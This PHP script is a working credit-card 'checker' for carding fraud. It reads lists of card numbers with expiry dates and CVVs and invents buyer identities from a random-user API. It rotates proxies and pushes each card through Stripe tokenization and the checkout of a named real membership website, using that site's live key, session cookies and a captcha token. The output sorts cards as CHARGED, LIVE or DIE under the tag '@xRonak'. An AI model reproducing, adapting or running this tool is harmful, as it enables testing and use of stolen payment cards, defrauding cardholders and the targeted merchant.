
<?php 
error_reporting(0);
//---------------------------------------//
$warnisx_site = "https://www.yasminmogahedtv.com/membership-account/membership-checkout/?level=4" ;
$amt = "12£" ;
//---------------------------------------//

$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
;

//==================[Randomizing Details]======================//
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');

curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 
//==================[Randomizing Details-END]======================//

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
# -------------------- [1 REQ] -------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.9 ',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Linux; Android 11; vivo 1901 Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.64 Mobile Safari/537.36.',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=aaf2d598-3190-4f6c-a996-c4a11902a9278a3979&sid=46fce8dd-b168-4ed2-b1b5-14d749c0c1745ec090&pasted_fields=number&payment_user_agent=stripe.js%2F8d7d636bec%3B+stripe-js-v3%2F8d7d636bec%3B+split-card-element&referrer=https%3A%2F%2Fwww.yasminmogahedtv.com&time_on_page=58670&key=pk_live_51HdbmyHNc8MTJAaGytBzUdQLnsyVtugsmpGoxyN6NwE9ip5CsvYgmwAgxB5JBcyGnORmoxbtZzdvMl4AN6TwejOX00t0lGfzmO&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQY5QYUasrZvaLk2av6uJn-Kf3lyD3ouZgydy3YNHQHRqWMTnCGNuR0PpMJYBvbGDcZFKUISHmHmzx8SQ3S_oHlwApAgvz-aJe_0-PuTx7sB9cgjMIGOv6fs3Prk0lCzjork5VEE9FzcMtlX-uagp0AmuXT1pYafBMverQMhm5JCuK0TBzdjdBcV7aCDGFNNdaGYBMMOoMCNH2sq9Ob0gJZ0OdHbO5BRbWlMzGtWxLyidlRlgu-AgCU65YrNmS8pi2d48jIKlfFsNpz8Ey-NkCqFoSvbDOv0SHs1cYDBThvr8ZsaApWI0WXXuozouVdl2SDqNlakiQB932Pv005mIo0mSqtnHOg4D3zZNiHY6PSZu1URRDNvwpDc7CQwlzm-BSydRQSz7l9BQzi3TScaJYuYsTNh4uc02BTfph8RTiRYGhngL_HcL5NfEhfHaj9qX-9viPcDEiaYkfSM-YZI_ruEFQX3xeCj3FeB9i0NfDzSo_jGsVfcsZv0WiV6CawmrjF1_3CU36k0jRmtZHpflanB08EfrxSItK-EfOHTJ1Ym8SQQBKHeQFfVC9V7IUBGB4mKyr_XKGvLo8sXhepgHNMa0nu1FDoOwUP9z6r3cfcLy0tZ3jKIjm3ABNzHgTaJm_--f0flO-LQB2jdg-nwGlxcpfl9oG0D18o3jhYUo39frcHuROAiL1Wm3ebQrXEg1I08H5AQYc4QxSWSP2I_JsyVunRvavgB39S9Ya1oXt19RmGMOtffEKl-HIL9ef3lWQRf8qD1xRejK-rCTgV8octC7aaLZ9cMRl5VWFLrjvWyDaBH36SavkPJER5rMcM6bPQcBGr_7UE8gYhgWWDbJZW8w90cJdXpmdEaJS0E7dg5mWRwbiUwh5SpjbHKTwY-naxF8zNEqTcqW0kZV2I1uPDt7ZP3OZP2aZguxnBaCETE3ghz2LEUWB34vpmOhrEqgWGDRmAPQ61WO4gpVtlgmVxowp4ZGrihiZSXNFOonZTp-V-HdvUHcwHh3BWGz0Hl1h8-Q1SYzIj2qpUGFJ5_HeJBzG9Fpeij9MscfF2BrEMh7VTXb_Ocp3ZLeSoXByMOk-pIkf8BRVeV4Vt5v5jGwY8touXbAj6PTyo86udC-xtj5asUZxQGke5dJdtEn9itZz8Z5fOYUIDF0WsikJWImm4H8mzU0iyCf-YYZiZBTXP5l3_xVG-GX_yzeb3jskiMXfmvgWfyT5vKTGqgSeoPvFhBi96MSSIkLBvtCmnDVwNbPXzQq0X-00lFFpdHgdxrWhMpc5WAKQHlceQtnlcP9zDtWnX7FUr06Qi6a6qjLbLbn6PM8l5FuFXdNGcSMZk1t_wpZ8ZfSYpS0HDrryYU6pn2W2UdMtUC3gp7KqRj_W_D0Fg58jCYJjufyI8N2ZhVundxVniiHBOx88MRvM1fur7JlLaDKH9nSVVvQQYZEmOy1FEpYiAw9dYFvueRjqgqkCH_Fb3_d-o5Ciy0DV7Et4D3GT0v2LIUHkUPQ2Os0Ykq6PVyirqKIC1EO2qLLRJCZkLVRU2oesZuEWeQVvF_2AH_W5-eK6hph_vUyXdfXQbvU19E_LSQ_10WZ6KMUJ7roq4KjEUlkBhf6f3xGohEErSAooYk4ZYSXuxOkF_fWemBQ98d1t46bM4OuPC_h2Qiinb0NlKW6yv62BnDXenWt6S00MbjyI7jfdBuVAhMwoNsGtw3f3t-Nr8R7E2ACD86zpSST0JPUVtZ8zPwy5p18NbMZCOzZbAwU3aoLTKIMVqp8_ZmP4NUqwpVqEHDHtQhZZuwnvjoR_iSm3eX8rBFRSMWC5lr12SC8_nzTvZ7ZrlMiyBGPnIB2qfy2RKHthrcQKARcljI5f2FDJgb_cRtsiv-_hBGzNuXI6iXLX3Bd2Zp9J5_8HPyenocHExJUzSKY36Y0O8Gcq1G8JdKNJn9NXHyDnXTOmsL-ZK9vkaw65RrA35U9jdCDfm5xXmzOQPsdp67PD3PI6mHg0VjdYUPKQnAOPbn3uM5oT01mT67ppho4NbXIPT0UBbBKHvznsbX4Peqwh8EWTJqSivFCjeoUPUwa9ZR38SnN-JkuZEj4RSudfdZ2USu07azH-0gsvf1joN52grSpuIhP4D3o2V4cM5mqTOaqHNoYXJkX2lkzg9y6m-ia3KoMzAxNDMzOTOicGQA.nq80dlCuTquzTay--bn7onSG2J1_zxwMInXo8Rgb6ro');




$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
#$pi = Getstr($result1,'client_secret":"','_secret');

#$src = Getstr($result1,'client_secret":"','"');
# -------------------- [2 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.yasminmogahedtv.com/membership-account/membership-checkout/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.yasminmogahedtv.com',
'method: POST',
'path:  /membership-account/membership-checkout/',
'scheme: https',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'content-type: application/x-www-form-urlencoded',
'Cookie: PHPSESSID=q3abakiubk63nofv5gh7070gv5; pmpro_visit=1; __stripe_mid=aaf2d598-3190-4f6c-a996-c4a11902a9278a3979; __stripe_sid=46fce8dd-b168-4ed2-b1b5-14d749c0c1745ec090',
'origin: https://www.yasminmogahedtv.com',
'referer: https://www.yasminmogahedtv.com/membership-account/membership-checkout/',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Linux; Android 6.0.1; Redmi 3S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'level=4&checkjavascript=1&other_discount_code=&username='.$firstname.'736&password=ronak223&password2=ronak223&bemail='.$email.'%40gmail.com&bconfirmemail='.$email.'%40gmail.com&fullname=&telephone=%2B4989287392&CardType=visa&discount_code=&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX7043&ExpirationMonth=09&ExpirationYear=2026');



$result2 = curl_exec($ch);
# ---------------------------------------#


# ---------------- [Responses] ----------------- #
if(strpos($result2, "payment_intent_unexpected_state")) {



    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Payment Intent Confirmed ⚠️ </span><br>';

    }

elseif(strpos($result2, "succeeded")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅  @xRonak </span><br>';
exit;
}

elseif(strpos($result2, "Your card has insufficient funds.")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS ✅  @xRonak </span><br>';
    exit;
    }



elseif(strpos($result2, "incorrect_zip")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE ✅  @xRonak </span><br>';
    exit;
    }
    
    elseif(strpos($result2, "Your card has insufficient funds.")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS ✅  @xRonak </span><br>';
    exit;
    }

elseif(strpos($result2, 'security code is incorrect.')) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅  @xRonak </span><br>';
    exit;
    }
    elseif(strpos($result2, 'security code is invalid.')) {

        echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅  @xRonak </span><br>';
        exit;
        }
    elseif(strpos($result2, "Security code is incorrect")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅  @xRonak </span><br>';
    }
    
elseif(strpos($result2, "transaction_not_allowed")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result:  CVV LIVE ✅  @xRonak </span><br>';
    exit;
    }
    

elseif(strpos($result2, "stripe_3ds2_fingerprint")) {


    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result:  3D ✅  @xRonak </span><br>';
    exit;
    }
elseif(strpos($result2, "generic_decline")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINE ❌ </span><br>';
    }

elseif(strpos($result2, "do_not_honor")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR ❌ </span><br>';

}


elseif(strpos($result2, "fraudulent")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT ❌ </span><br>';

}
elseif(strpos($result2, "intent_confirmation_challenge")) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Captcha ⚠️ </span><br>';

    }


elseif(strpos($result2, 'Your card was declined.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline </span><br>';
}

elseif(strpos($result2, 'Error updating default payment method. Your card was declined.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline </span><br>';
}

elseif(strpos($result2, '"cvc_check": "pass"')) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅  @xRonak </span><br>';
exit;
}

elseif(strpos($result2, "Membership Confirmation")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result: Membership Confirmation '.$amt.' ✅  xRonak /span><br>';
exit;
}

elseif(strpos($result2, "Thank you for your support!")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅  @xRonak </span><br>';
exit;
}

elseif(strpos($result2, "Thank you for your donation")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅  @xRonak </span><br>';
exit;
}

elseif(strpos($result2, "/wishlist-member/?reg=")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅  @xRonak </span><br>';
exit;
}

elseif(strpos($result2, "Thank You For Donation.")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅  @xRonak </span><br>';
exit;
}

elseif(strpos($result2, "Thank You")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅  @xRonak </span><br>';
exit;
}

elseif(strpos($result2, "incorrect_cvc")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CCN LIVE ✅  @xRonak </span><br>';
exit;
}

elseif(strpos($result2, "Card is declined by your bank, please contact them for additional information.")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅  @xRonak </span><br>';
exit;
}

elseif(strpos($result2, "Your card does not support this type of purchase.")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅  @xRonak </span><br>';
exit;
}

elseif(strpos($result2, "Your card is not supported.")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CARD NOT SUPPORTED </span><br>';
exit;
}


else {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED ❌ </span><br>';

}



curl_close($ch);
ob_flush();
#echo $result1;
#echo $result2; 
?>